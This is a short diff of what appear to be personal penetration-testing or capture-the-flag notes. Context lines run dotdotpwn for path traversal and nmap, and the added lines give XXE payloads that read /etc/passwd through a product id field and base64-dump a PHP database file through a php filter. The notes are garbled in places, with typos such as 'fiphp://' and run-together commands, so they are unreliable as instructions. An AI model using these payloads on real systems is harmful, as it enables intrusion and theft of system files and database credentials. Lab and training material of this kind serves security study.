@@ -66,3 +66,9 @@ sudo dotdotpwn -m http -h localhost:8080/#/login
 [auto run file triversal using dotdotpwn]
 
 sudo openvpn nmap -sV {target IP}
+
+<!DOCTYPE foo [
+
+<!ENTITY xxe SYSTEM "file:////etc/passwd" >]> {add (&xxe;) to product id column to call XML Injection}
+<!ENTITY xxe SYSTEM "fiphp://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
+[pull up database request] 
